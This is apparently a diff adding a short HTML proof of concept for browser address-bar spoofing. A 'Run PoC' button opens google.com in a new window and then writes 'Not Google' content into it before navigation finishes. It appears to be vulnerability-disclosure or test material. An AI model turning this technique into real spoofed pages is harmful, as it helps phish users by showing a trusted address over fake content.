@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Run PoC</button>
+
+    <script>
+      function spoof() {
+        // Open target URL (spoofed address bar)
+        let win = window.open("https://www.google.com/", "_blank");
+
+        // Inject content before navigation commits
+        setTimeout(() => {
+          try {
+            win.document.write(`
+              <h1>Not Google</h1>
+              <p>This content is rendered while the address bar shows google.com</p>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.log(e);
+          }
+        }, 50);
+      } //test
+    </script>
+  </body>
+</html>
